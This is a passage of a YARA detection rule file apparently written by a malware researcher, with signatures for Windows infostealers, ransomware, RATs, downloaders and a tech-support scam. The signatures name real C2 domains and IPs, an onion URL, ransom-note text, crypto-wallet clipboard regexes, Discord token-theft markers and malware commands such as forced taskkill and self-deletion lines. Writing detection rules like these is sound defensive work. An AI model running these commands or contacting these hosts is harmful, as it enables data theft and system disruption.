$s8 = "^((((3|1)[A-Za-z0-9]{33}))(\\s|$)|(bc1q)[A-Za-z0-9]{38}(\\s|$))" fullword ascii
$s9 = "^(0x)?[A-Za-z0-9]{40}(\\s|$)" fullword ascii
$s10 = "clipRegex" fullword ascii
$s11 = "%s?k=%s&src=clip&id=%s" fullword ascii
$s12 = "http://izuw6rclbgl2lwsh.onion/o.php" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($x*) or 8 of ($s*) or (3 of ($x*) and 5 of ($s*)))
}
rule SSC_Win_Spectre {
meta:
author = "ditekSHen"
description = "Detects Spectre infostealer"
snort_sid = "920233-920234"
strings:
$s1 = "\\../../../json.h" wide
$s2 = "static_cast<std::size_t>(index) < kCachedPowers.size()" fullword wide
$s3 = " cmd.exe" fullword wide
$s4 = "m_it.object_iterator != m_object->m_value.object->end()" fullword wide
$h1 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" fullword wide
$h2 = "----974767299852498929531610575" ascii wide
$h3 = "Content-Disposition: form-data; name=\"file\"; filename=\"" fullword ascii
condition:
(uint16(0) == 0x5a4d and ((all of ($s*) and 1 of ($h*)) or (all of ($h*) and 2 of ($s*)))) or (6 of them)
}
rule SSC_Win_HUNT_BlackByte {
meta:
author = "ditekSHen"
description = "Attempt on hunting BlackByte ransomware"
strings:
$s1 = "WalkDirAndEncrypt" ascii wide nocase
$s2 = "FileEncrypt" ascii wide nocase
$s3 = "BlackByte." ascii wide nocase
$s4 = "EnumerateDirAndEncrypt" ascii wide nocase
$s5 = "Dismount-DiskImage" ascii wide nocase
$s6 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options" ascii wide nocase
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_DLInjector05 {
meta:
author = "ditekSHen"
description = "Detects downloader / injector (NiceProcess)"
strings:
$s1 = "pidhtmpfile.tmp" fullword ascii
$s2 = "pidhtmpdata.tmp" fullword ascii
$s3 = "pidHTSIG" fullword ascii
$s4 = "Taskmgr.exe" fullword ascii
$s5 = "[HP][" ascii
$s6 = "[PP][" ascii
$s7 = { 70 69 64 68 74 6d 70 66 69 6c 65 2e 74 6d 70 00
2e 64 6c 6c 00 00 00 00 70 69 64 48 54 53 49 47
00 00 00 00 ?? ?? 00 00 54 61 73 6b 6d 67 72 2e
65 78 65 }
condition:
uint16(0) == 0x5a4d and 4 of them
}
rule SSC_Win_Kutaki {
meta:
author = "ditekSHen"
description = "Detects Kutaki"
strings:
$x1 = "AASEaHR0cDovL29qb3JvYmlhLmNsdWIvbGFwdG9wL2xhcHRvcC5waHA" ascii
$x2 = "aHR0cDovL3RlcmViaW5uYWhpY2MuY2x1Yi9zZWMva29vbC50eHQ" ascii
$s1 = "wewqeuuiwe[XXXXXXX]" ascii
$s2 = "alt|aHR0cD" ascii
$s3 = "<rdf:Description about='uuid:fb761dc9-9daf-11d9-9a32-fcf1da45dca2'" ascii
$s4 = "<rdf:Description about='uuid:0ab54f47-96d6-11d9-a59c-cbc93330e07e'" ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($x*) and 1 of ($s*)) or (all of ($s*)))
}
rule SSC_Win_DLInjector06 {
meta:
author = "ditekSHen"
description = "Detects downloader / injector"
strings:
$s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" ascii wide
$s2 = "Content-Type: application/x-www-form-urlencoded" wide
$s3 = "https://ipinfo.io/" wide
$s4 = "https://db-ip.com/" wide
$s5 = "https://www.maxmind.com/en/locate-my-ip-address" wide
$s6 = "https://ipgeolocation.io/" wide
$s7 = "POST" fullword wide
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_Crown {
meta:
author = "ditekSHen"
description = "Detects Crown Tech Support Scam"
snort_sid = "920251-920261"
strings:
$d1 = "//prodownload.live" ascii
$c1 = "&uid=" ascii
$c2 = "&ver=" ascii
$c3 = "&mcid=" ascii
$c4 = ".php?uid=" ascii
$c5 = ".php?ip=" ascii
$s1 = "Operating System Support ID:" ascii
$s2 = "taskkill /IM explorer.exe -f" ascii nocase
$s3 = "/C taskkill /IM Taskmgr.exe -f" ascii nocase
$s4 = "FastSuport" fullword ascii
$s5 = "Support Override!" fullword wide
$s6 = "Support Assistance Override Activated!" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($c*) or 4 of ($s*) or (1 of ($d*) and (3 of ($c*) or 2 of ($s*))))
}
rule SSC_Win_FloodFix {
meta:
author = "ditekSHen"
description = "Detects FloodFix"
condition:
uint16(0) == 0x5a4d and pe.is_dll() and (pe.exports("FloodFix") or pe.exports("FloodFix2")) and pe.exports("crc32")
}
rule SSC_Win_UNK_InfoStealer {
meta:
author = "ditekSHen"
description = "Detects unknown information stealer"
snort_sid = "920263"
hash1 = "b7a2cb34d3bc42d6d4c9d9af7dd406e2a5caef8ea46e5d09773feeb9920a6b21"
hash2 = "dd95377842932d77e225b126749e1e6e8ecd6f5c6540d084a551a80a54d02d7d"
hash3 = "12f790d9a0775b5e62effc6ea9e55bbef345fffbfb2f671f85098c4f7661dd0f"
hash4 = "0a4cea763dffde451c75a434143fc5d014c32c6d1f8f34920ea5f2854e62118f"
strings:
$s1 = "%s\\%s\\%s-Qt" fullword wide
$s2 = "%s\\%s.json" fullword wide
$s3 = "*.mmd*" fullword wide
$s4 = "%s\\%s.vdf" fullword wide
$s5 = "%-50s %s" fullword wide
$s6 = "dISCORD|lOCAL" fullword ascii nocase
$s7 = "sTORAGE|LEVELDB" fullword ascii nocase
$s8 = ".coin" fullword ascii
$s9 = ".emc" fullword ascii
$s10 = ".lib" fullword ascii
$s11 = ".bazar" fullword ascii
$s12 = "id=%d" fullword ascii
$s13 = "2:?/v /v /v /^Y" fullword ascii
condition:
uint16(0) == 0x5a4d and 8 of them
}
rule SSC_Win_DECAF {
meta:
author = "ditekSHen"
description = "Detects DECAF ransomware"
strings:
$s1 = "main.EncWorker" fullword ascii
$s2 = "Paths2Encrypt" fullword ascii
$s3 = "/cmd/encryptor/main.go" ascii
$s4 = "*win.FileUtils; .autotmp_41 *lib.Encryptor; .autotmp_" ascii
$s5 = "\"Microsoft Window" fullword wide
$s6 = "Legal_Policy_Statement" fullword wide
$s7 = ").Encrypt." ascii
$s8 = "*struct { F uintptr; pw *os.File; c *" ascii
$s9 = ".ListFilesToEnc." ascii
$m1 = "WINNER WINNER CHICKEN DINNER" ascii
$m2 = "All your servers and computers are encrypted" ascii
$m3 = "We guarantee to decrypt one image file for free." ascii
$m4 = "We WILL NOT be able to RESTORE them." ascii
condition:
uint16(0) == 0x5a4d and (4 of ($s*) or 3 of ($m*) or (1 of ($m*) and 2 of ($s*)))
}
rule SSC_Win_WinDealer {
meta:
author = "ditekSHen"
description = "Detects WinDealer"
snort_sid = "920264"
strings:
$d1 = "downfile" fullword ascii
$d2 = "getmypath" fullword ascii
$d3 = "content-type: monitor" fullword ascii
$d4 = "content-type: UsedType" fullword ascii
$d5 = "write command error" fullword ascii
$d6 = "C:\\WINDOWS\\system32\\kernel32.dll" fullword ascii
$l1 = "currentconfig" fullword ascii
$l2 = "remotedomain" fullword ascii
$l3 = "reserveip" fullword ascii
$l4 = "otherinfo" fullword ascii
$l5 = "filelen" fullword ascii
$l6 = "%s%s.bak" fullword wide
$l7 = "localmachine" fullword ascii
$l8 = "remoteip" fullword ascii
$l9 = "datastate" fullword ascii
$l10 = "SYSTEM\\CurrentControlSet\\Control\\Network\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\%s\\Connection" fullword ascii
$s1 = "%s\\%s\\V5_History.dat" fullword wide
$s2 = "%s\\%s\\history2.dat" fullword wide
$s3 = "%s\\%s\\history.imw" fullword wide
$s4 = "%s\\%s\\main.imw" fullword wide
$s5 = "%s%d.%d.%d.%dWindows/%u" fullword ascii
$s6 = "%s\\%c_%s_tmp" fullword wide
$s7 = "%s\\%s\\main.db" fullword wide
condition:
uint16(0) == 0x5a4d and ((4 of ($d*) and 1 of ($s*)) or (5 of ($s*) and 1 of ($d*)) or 6 of ($l*) or (pe.exports("DealC") and pe.exports("DealR") and pe.exports("DealS") and 1 of them))
}
rule SSC_Win_ExMatter {
meta:
author = "ditekSHen"
description = "Detects BlackMatter data exfiltration tool"
hash1 = "4a0e10e1e9fea0906379f99fa350b91c2af37f0fd2cc55491643cc71a9887d30"
hash2 = "a5e050f1278473d41c3a3d6f98f3fd82932f51a937bc57d8f5605815f0efb0f8"
strings:
$s1 = "Renci.SshNet." ascii
$s2 = "DirNotEmpty" fullword ascii
$s3 = "MkDir" fullword ascii
$s4 = "RmDir" fullword ascii
$s5 = "get_MainWindowHandle" fullword ascii
$s6 = "GetCurrentProcess" fullword ascii
$s7 = "]]>]]>" fullword wide
$s8 = "1.3.132.0.35" fullword wide
$s9 = "1.3.132.0.34" fullword wide
$s10 = "1.2.840.10045.3.1.7" fullword wide
$x1 = "sender2.pdb" fullword ascii
$x2 = { 64 00 61 00 74 00 61 00 ?? 72 00 6f 00 6f 00 74 }
$x3 = "157.230.28.192" fullword wide
condition:
uint16(0) == 0x5a4d and (all of ($s*) or (1 of ($x*) and 7 of ($s*)))
}
rule SSC_Win_BrbBot {
meta:
author = "ditekSHen"
description = "Detects BrbBot"
snort_sid = "920265"
strings:
$x1 = "brbconfig.tmp" fullword ascii
$x2 = "brbbot" fullword ascii
$s1 = "%s?i=%s&c=%s&p=%s" fullword ascii
$s2 = "exec" fullword ascii
$s3 = "CONFIG" fullword ascii wide
$s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)" fullword ascii
$s5 = { 43 4f 4e 46 49 47 00 00 65 6e 63 6f 64 65 00 00
73 6c 65 65 70 00 00 00 65 78 69 74 00 00 00 00
63 6f 6e 66 00 00 00 00 66 69 6c 65 00 00 00 00
65 78 65 63 }
condition:
uint16(0) == 0x5a4d and ((all of ($x*) and 1 of ($s*)) or (1 of ($x*) and 4 of ($s*)) or all of ($s*))
}
rule SSC_Win_BabylonRAT {
meta:
author = "ditekSHen"
description = "Detects BabylonRAT / CollectorStealer / ParadoxRAT"
strings:
$x1 = "Babylon RAT Client" wide nocase
$x2 = "ParadoxRAT_Client" fullword ascii
$s1 = "@ConfigsEx" fullword wide
$s2 = "ClipBoard.txt" fullword wide
$s3 = "[%02d/%02d/%d %02d:%02d:%02d] [%s] (%s):" fullword wide
$s4 = "\\%Y %m %d - %I %M %p" fullword wide
$s5 = "[%02d/%02d/%d %02d:%02d:%02d] (%s)" fullword wide
$s6 = " c:\\Windows\\system32\\cmd.exe" fullword wide
$s7 = "Update Failed [OpenProcess]" wide
$s8 = "DoS Already Active..." fullword wide
$s9 = "File Downloaded and Execut" wide
$s10 = "LgDError33x98dGetProcAddress" fullword wide
$s11 = "@SPYNET" fullword wide
$s12 = "Recovery.Recovery" fullword wide
$s13 = "GetChrome" fullword wide
$s14 = "\\drivers\\etc\\HOSTS" fullword ascii
$s15 = "plugin-container.exe" fullword ascii
$s16 = "bss_server.usrRelay" fullword ascii
$s17 = "sckRelay" fullword ascii
condition:
uint16(0) == 0x5a4d and (all of ($x*) or (1 of ($x*) and 3 of ($s*)) or 8 of ($s*))
}
rule SSC_Win_NetSupport {
meta:
author = "ditekSHen"
description = "Detects NetSupport client"
snort_sid = "920266-920267"
strings:
$s1 = ":\\nsmsrc\\nsm\\" fullword ascii
$s2 = "name=\"NetSupport Client Configurator\"" fullword ascii
$s3 = "<description>NetSupport Manager Remote Control.</description>" fullword ascii
condition:
uint16(0) == 0x5a4d and 2 of them
}
rule SSC_Win_GoBrutLoader {
meta:
author = "ditekSHen"
description = "Detects GoBrut StealthWorker laoder"
condition:
uint16(0) == 0x5a4d and pe.exports("@SetFirstEverVice@8")
}
rule SSC_Win_Milan {
meta:
author = "ditekSHen"
description = "Detects Milan Lyceum backdoor"
hash1 = "21ab4357262993a042c28c1cdb52b2dab7195a6c30fa8be723631604dd330b29"
hash2 = "a2754d7995426b58317e437f8ed6770cd7bb7b18d971e23b2b300b75e34fa086"
hash3 = "b46949feeda8726c0fb86d3cd32d3f3f53f6d2e6e3fcd6f893a76b8b2632b249"
hash4 = "b54a67062bdcd32dfa9f3d7b69780d2e6e4925777290bc34e8f979a1b4b72ea2"
hash5 = "b766522dd4189fef7775d663e5649ba9d8be8e03022039d20848fcbc3643e5f2"
hash6 = "d3606e2e36db0a0cb1b8168423188ee66332cae24fe59d63f93f5f53ab7c3029"
hash7 = "857e2f63a1078d49adc59a03482f7b362563f16fb251f174bdaa7759ed47922a"
hash8 = "4f1b8c9209fa2684aa3777353222ad1c7716910dbb615d96ffc7882eb81dd248"
strings:
$ua1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)" fullword wide
$ua2 = "Mozilla/5.0 (Android; Mobile; rv:28.0) Gecko/28.0 Firefox/28.0" fullword wide
$ua3 = "Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 520)" fullword wide
$ua4 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; XBLWP7; ZuneWP7)" fullword wide
$ua5 = "Mozilla/5.0 (IE 11.0; Windows NT 6.3; Trident/7.0; .NET4.0E; .NET4.0C; rv:11.0) like Gecko" fullword wide
$ua6 = "Mozilla/5.0 (iPad; U; CPU OS 5_1_1 like Mac OS X; en-us) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3" fullword wide
$ua7 = "Mozilla/5.0 (Linux; Android 4.1; Galaxy Nexus Build/JRN84D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19" fullword wide
$ua8 = "Mozilla/5.0 (Linux; Android 7.1.1; ASUS_X017DA Build/NGI77B; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/1.5.1(11790) Chrome/74.0.3729.157 Mobile Safari/537.36" fullword wide
$ua9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0" fullword wide
$ua10 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" fullword wide
$ua11 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36" fullword wide
$ua12 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0" fullword wide
$n1 = "charset={[A-Za-z0-9\\-_]+}" fullword wide
$n2 = "Content-Length: {[0-9]+}" fullword wide
$n3 = "Location: {[0-9]+}" fullword wide
$n4 = "Set-Cookie:\\b*{.+?}\\n" fullword wide
$n5 = "{<html>}" fullword wide
$n6 = "&formid=" fullword ascii
$n7 = "/?id=" fullword ascii
$p1 = "\\milan\\Debug\\Milan.pdb" ascii
$p2 = "\\milan\\Release\\Milan.pdb" ascii
$p3 = "\\BackDor Last\\" ascii
$p4 = "\\BackDorLast\\" ascii
$s1 = "/q \"%s\" & waitfor" wide
$s2 = "/q \"%s\" & schtasks /delete" wide
$s3 = "*BOT@;" fullword ascii
$s4 = "mofcomp \"" fullword ascii
$s5 = "\"WQL\";};instance of " ascii
$s6 = "</svalue>" fullword wide
$s7 = "cmd.exe /C " wide nocase
$d1 = "akastatus.com" ascii
$d2 = "centosupdatecdn.com" ascii
$d3 = "checkinternet.org" ascii
$d4 = "cybersecnet.co.za" ascii
$d5 = "cybersecnet.org" ascii
$d6 = "defenderlive.com" ascii
$d7 = "defenderstatus.com" ascii
$d8 = "digitalmarketingagency.net" ascii
$d9 = "dnsanalizer.com" ascii
$d10 = "dnscatalog.net" ascii
$d11 = "dnscdn.org" ascii
$d12 = "dnsstatus.org" ascii
$d13 = "excsrvcdn.com" ascii
$d14 = "hpesystem.com" ascii
$d15 = "livednscdn.com" ascii
$d16 = "micrsoftonline.net" ascii
$d17 = "ndianmombais.com" ascii
$d18 = "online-analytic.com" ascii
$d19 = "securednsservice.net" ascii
$d20 = "sysadminnews.info" ascii
$d21 = "uctpostgraduate.com" ascii
$d22 = "updatecdn.net" ascii
$d23 = "web-traffic.info" ascii
$d24 = "windowsupdatecdn.com" ascii
$d25 = "wsuslink.com" ascii
$d26 = "zonestatistic.com" ascii
condition:
uint16(0) == 0x5a4d and ((1 of ($p*) and (2 of ($s*) or 2 of ($ua*))) or (5 of ($n*) and (2 of ($ua*) or 1 of ($p*) or 1 of ($s*))) or (3 of ($s*) and (2 of ($ua*) or 5 of ($n*))) or (2 of ($d*) and 6 of them))
}
rule SSC_Win_UNK05 {
meta:
author = "ditekSHen"
description = "Detects potential BazarLoader"
strings:
$s1 = "/api/get" ascii wide
$s2 = "PARENTCMDLINE" fullword ascii
$s3 = "https://microsoft.com/telemetry/update.exe" ascii wide
$s4 = "api.opennicproject.org" fullword ascii wide
$s5 = "https://%hu.%hu.%hu.%hu:%u" fullword ascii wide
$s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.31" ascii wide
$s7 = "PARENTJOBID" fullword ascii wide
$s8 = "\\System32\\rundll32.exe" fullword ascii wide
$s9 = "{ccc38b40-5b04-4fb1-a684-07c7e448d4df}" fullword ascii wide // mutex
$s10 = "{065f6686-990b-46fc-829c-a53ec188a723}" fullword ascii wide // mutex
condition:
uint16(0) == 0x5a4d and 6 of them
}
rule SSC_Win_ClipBanker01 {
meta:
author = "ditekSHen"
description = "Detects ClipBanker infostealer"
strings:
$s1 = "Clipper" fullword wide
$s2 = "Ushell" fullword wide
$s3 = "Banker" fullword wide
$s4 = "ClipPurse" fullword wide nocase
$s5 = "SelfClip" fullword wide
$s6 = "Cliper" fullword wide
$s7 = "FHQD4313-33DE-489D-9721-6AFF69841DEA" fullword wide
$s8 = "Remove.bat" fullword wide
$s9 = "\\w{1}\\d{12}" fullword wide
$s10 = "SELECT * FROM Win32_ComputerSystem" fullword wide
$s11 = "red hat" fullword wide
$s12 = { 73 00 63 00 68 00 74 00 61 00 73 00 6b 00 73 00
2e 00 65 00 78 00 65 00 00 ?? 2f 00 63 00 72 00
65 00 61 00 74 00 65 00 20 00 2f 00 73 00 63 00
20 00 00 ?? 20 00 2f 00 6d 00 6f 00 20 00 00 ??
20 00 2f 00 72 00 6c 00 20 00 00 ?? 20 00 2f 00
74 00 6e 00 20 00 00 ?? 20 00 2f 00 74 00 72 00
20 00 00 ?? 20 00 ?? 00 ?? 00 00 ?? 2f 00 64 00
65 00 6c 00 65 00 74 00 65 00 20 00 2f 00 74 00
6e }
$s13 = "ClipChanger" fullword ascii
$s14 = "CheckVirtual" fullword ascii
$s15 = "InjReg" fullword ascii
$s16 = "SuicideFile" fullword ascii
$s17 = "HideFile" fullword ascii
$s18 = "AntiVm" fullword ascii
condition:
uint16(0) == 0x5a4d and 7 of them
}
rule SSC_Win_ZombieBoy {
meta:
author = "ditekSHen"
description = "Detects ZombieBoy Downloader"
strings:
$s1 = ":\\Users\\ZombieBoy\\" ascii wide
$s2 = "RookIE/1.0" fullword ascii wide
condition:
uint16(0) == 0x5a4d and all of them
}
rule SSC_Win_PCRat {
meta:
author = "ditekSHen"
description = "Detects PCRat / Gh0st"
strings:
$s1 = "ClearEventLogA" fullword ascii
$s2 = "NetUserAdd" fullword ascii
$s3 = "<H1>403 Forbidden</H1>" fullword ascii
$s4 = ":]%d-%d-%d  %d:%d:%d" fullword ascii
$s5 = "Mozilla/4.0 (compatible)" fullword ascii
$s6 = "<Enter>" fullword ascii
$s7 = "\\cmd.exe" fullword ascii
$s8 = "Program Files\\Internet Explorer\\IEXPLORE.EXE" fullword ascii
$s9 = "Collegesoft ScenicPlayer" fullword wide
$a1 = "360tray.exe" fullword ascii
$a2 = "avp.exe" fullword ascii
$a3 = "RavMonD.exe" fullword ascii
$a4 = "360sd.exe" fullword ascii
$a5 = "Mcshield.exe" fullword ascii
$a6 = "egui.exe" fullword ascii
$a7 = "kxetray.exe" fullword ascii
$a8 = "knsdtray.exe" fullword ascii
$a9 = "TMBMSRV.exe" fullword ascii
$a10 = "avcenter.exe" fullword ascii
$a11 = "ashDisp.exe" fullword ascii
condition:
uint16(0) == 0x5a4d and 5 of ($s*) and 6 of ($a*)
}
rule SSC_Win_Rapid {
meta:
author = "ditekSHen"
description = "Detects Rapid ransomware"
strings:
$s1 = "encblklen" fullword ascii
$s2 = ".rapid" fullword ascii
$s3 = "BgIAAACkAABSU0E" ascii
$s4 = "IFdlIHNlbmQ" ascii
$s5 = "Software\\EncryptKeys" fullword ascii
$s6 = "local_enc_private_key" fullword ascii
$s7 = "local_public_key" fullword ascii
$s8 = "How Recovery Files.txt" ascii
$s9 = "recovery.txt" ascii
$s10 = "thr %i run %s" fullword ascii
$s11 = " /TN Encrypter" ascii
$s12 = /Encrypter_\d+/ fullword ascii
$s13 = "BleepingComputer_rapid" ascii wide
$m1 = "tell us your unique ID - ID-" ascii
$m2 = "really want to restore your files?" ascii
condition:
uint16(0) == 0x5a4d and (6 of ($s*) or (1 of ($m*) and 4 of ($s*)))
}
rule SSC_Win_Satana {
meta:
author = "ditekSHen"
description = "Detects Satana ransomware"
snort_sid = "920269-920270"
strings:
$bf1 = "Try Decrypt: uc_size = %d, c_size = %d" ascii
$bf2 = "dwMailSelector = %d  dwBtcSelector = %d" ascii
$bf3 = "%s: Error DecB: 0x%X" ascii
$bf4 = "MBR written to Disk# %d" ascii
$bf5 = "!SATANA!" ascii wide nocase
$bf6 = "1 -th start" fullword ascii
$bf7 = "id=%d&code=%d&sdata=%d.%d.%d %d %d %s %s %d&name=%s&md5=%s&dlen=%s" ascii
$bf8 = "threadAdminFlood: %s %s %s" wide
$bf9 = "%s: NET RES FOUND: %s" wide
condition:
(uint16(0) == 0x5a4d and 4 of ($bf*)) or (5 of ($bf*))
}
rule SSC_Win_VirLock {
meta:
author = "ditekSHen"
description = "Detects VirLock ransomware"
strings:
$x1 = "BThere are two ways to pay a fine:" fullword wide
$x2 = "^Es gibt zwei M" fullword wide
$x3 = "glichkeiten, eine Strafe zahlen." fullword wide
$x4 = /usertile\d+\.bmp/ fullword wide
$s1 = "WinSock 2.0" fullword ascii
$s2 = "Running" fullword ascii
$s3 = "echo WScript.Sleep(50)>%TEMP%/file.vbs" fullword ascii
$s4 = "cscript %TEMP%/file.vbs" fullword ascii
$s5 = "del /F /Q file.js" fullword ascii
$s6 = "del /F /Q %1" fullword ascii
$s7 = "del /F /Q %0" fullword ascii
condition:
(uint16(0) == 0x5a4d and ((2 of ($x*) and 2 of ($s*)) or (5 of ($s*) and 1 of ($x*)))) or (8 of them)
}
rule SSC_Win_PirateStealer {
meta:
author = "ditekSHen"
description = "Detects PirateStealer"
strings:
$s1 = "PirateStealerBTW" wide
$s2 = "/PirateStealer/main/src/" wide
$s3 = "%WEBHOOK_LINK%" fullword wide
$s4 = "your_webhook_here" fullword wide
$s5 = "PirateMonsterInjector" ascii wide
$s6 = "DiscordProcesses" fullword ascii
$s7 = "GetDiscords" fullword ascii
$s8 = { 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 00 47
65 74 46 6f 6c 64 65 72 50 61 74 68 00 57 65 62
68 6f 6f 6b 00 4b 69 6c 6c 00 50 72 6f 67 72 61
6d 00 53 79 73 74 65 6d 00 4d 61 69 6e 00 }
condition:
uint16(0) == 0x5a4d and 3 of them
}
rule SSC_Win_NGLite {
meta:
author = "ditekSHen"
description = "Detects NGLite"
strings:
$x1 = "/lprey/main.go" ascii
$x2 = "/NGLiteV1.01/lprey/" ascii
$x3 = "/ng.com/lprey/" ascii
$x4 = "/mnt/hgfs/CrossC2-2.2/src/" ascii
$x5 = "WHATswrongwithUu" ascii
$s1 = "main.Preylistener" fullword ascii
$s2 = "main.Runcommand" fullword ascii
$s3 = "main.RandomPass" fullword ascii
$s4 = "main.AesEncode" fullword ascii
$s5 = "main.RsaEncode" fullword ascii
$s6 = "main.AesDecode" fullword ascii
$s7 = "main.initonce" fullword ascii
$s8 = "main.SendOnce" fullword ascii
$s9 = "main.clientConf" fullword ascii
$s10 = "main.Sender" fullword ascii
condition:
(uint16(0) == 0x5a4d or uint16(0) == 0x457f or uint16(0) == 0xfacf) and ((1 of ($x*) and 2 of ($s*)) or (6 of ($s*)))
}
rule SSC_Win_KdcSponge {
meta:
author = "ditekSHen"
description = "Detects KdcSponge"
hash1 = "e391c2d3e8e4860e061f69b894cf2b1ba578a3e91de610410e7e9fa87c07304c"
strings:
$x1 = "\\share\\kdcdll\\user641.pdb" ascii
$x2 = "5ADSelf@tech*7890" fullword wide
$kdc1 = "KdcVerifyEncryptedTimeStamp" ascii wide nocase
$kdc2 = "KerbHashPasswordEx3" ascii wide nocase
$kdc3 = "KerbFreeKey" ascii wide nocase
$r1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
$r2 = "KDC Service" fullword ascii
$s1 = "download//symbols//%S//%S//%S" fullword wide
$s2 = "c:\\windows\\system32\\kdcsvc.dll" fullword wide nocase
$s3 = /WinHttp(Send|Receive)(Request|Response) failed (0x%.8X)/ fullword wide
condition:
uint16(0) == 0x5a4d and (
(1 of ($x*) and 2 of them) or (all of ($kdc*) and (1 of ($x*) or all of ($r*) or 2 of ($s*))) or (8 of them) or
(
pe.exports("MainFun") and
pe.exports("NetApiBufferFree") and
pe.exports("BeaEngineRevision") and
pe.exports("BeaEngineVersion") and
pe.exports("Disasm") and
pe.exports("DllRegisterServer") and
pe.exports("DsGetDcName") and
2 of them
)
)
}
rule SSC_Win_Chinotto {
meta:
author = "ditekSHen"
description = "Detects Chinotto"
strings:
$x1 = "xxxchinotto" ascii wide
$x2 = "\\Chinotto.pdb" ascii wide
$x3 = { 50 4f 53 54 20 25 73 20 48 54 54 50 2f 31 2e 31
0d 0a 41 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e
67 3a 20 67 7a 69 70 2c 20 64 65 66 6c 61 74 65
0d 0a 55 73 65 72 2d 41 67 65 6e 74 3a 20 4d 6f
7a 69 6c 6c 61 2f 34 2e 30 28 63 6f 6d 70 61 74
69 62 6c 65 3b 20 4d 53 49 45 20 36 2e 30 3b 20
57 69 6e 64 6f 77 73 20 4e 54 20 35 2e 31 3b 20
53 56 31 29 0d 0a 41 63 63 65 70 74 3a 20 69 6d
61 67 65 2f 67 69 66 2c 20 69 6d 61 67 65 2f 78
2d 78 62 69 74 6d 61 70 2c 20 69 6d 61 67 65 2f
6a 70 65 67 2c 20 69 6d 61 67 65 2f 70 6a 70 65
67 2c 20 61 70 70 6c 69 63 61 74 69 6f 6e 2f 78
2d 73 68 6f 63 6b 77 61 76 65 2d 66 6c 61 73 68
2c 20 2a 0d 0a 41 63 63 65 70 74 2d 4c 61 6e 67
75 61 67 65 3a 20 65 6e 2d 75 73 0d 0a 43 6f 6e
74 65 6e 74 2d 54 79 70 65 3a 20 6d 75 6c 74 69
70 61 72 74 2f 66 6f 72 6d 2d 64 61 74 61 3b 62
6f 75 6e 64 61 72 79 3d 25 73 0d 0a 48 6f 73 74
3a 20 25 73 3a 25 64 0d 0a 43 6f 6e 74 65 6e 74
2d 4c 65 6e 67 74 68 3a 20 25 64 0d 0a 43 6f 6e
6e 65 63 74 69 6f 6e 3a 20 4b 65 65 70 2d 41 6c
69 76 65 0d 0a 43 61 63 68 65 2d 43 6f 6e 74 72
6f 6c 3a 20 6e 6f 2d 63 61 63 68 65 0d 0a 0d 0a
00 00 00 00 48 54 54 50 2f 31 2e 31 20 32 30 30
20 4f 4b 00 0d 0a 0d 0a 00 00 00 00 65 72 72 6f
72 3c 2f 62 3e }
$s1 = "Run /v xxxzexs /t REG_SZ /d %s /f" ascii wide
$s2 = "ShellExecute Error, ret" ascii wide
$s3 = "Run app succeed" ascii
$s4 = "cleartemp:" fullword ascii
$s5 = "wakeup:" fullword ascii
$s6 = "updir:" fullword ascii
$s7 = "regstart:" fullword ascii
$s8 = "chdec:" fullword ascii
$s9 = "cmd:" fullword ascii
$s10 = "error</b>" fullword ascii
$c1 = "Host: %s:%d" ascii wide
$c2 = "Mozilla/4.0(compatible; MSIE 6.0; Windows NT 5.1; SV1)" ascii wide
$c3 = "Mozilla/5.0(Windows NT 10.0; Win64; x64)AppleWebKit/537.36(KHTML, like Gecko)Chrome/78.0.3904.108 Safari/537.36" ascii wide
$c4 = "id=%s&type=hello&direction=send" ascii wide
$c5 = "id=%s&type=command&direction=receive" ascii wide
$c6 = "id=%s&type=file&direction=" ascii wide
$c7 = "id=%s&type=result&direction=" ascii wide
condition:
uint16(0) == 0x5a4d and (2 of ($x*) or (1 of ($x*) and (2 of ($s*) or 2 of ($c*))) or 4 of ($c*) or 5 of ($s*))
}
rule SSC_Win_Tardigrade {
meta:
author = "ditekSHen"
description = "Detects Tardigrade"
hash1 = "c0976a1fbc3dd938f1d2996a888d0b3a516b432a2c38d788831553d81e2f5858"
hash2 = "966b2c7c72a28310acd58bb23af4d3c893b2afca264b2d9c0ec42db815c77487"
hash3 = "88be5da274df704dc7fd9882c661a0afdd35f1ce0a7145e30f51c292abd2a86b"
hash4 = "cf88926b7d5a5ebbd563d0241aaf83718b77cec56da66bdf234295cc5a91c5fe"
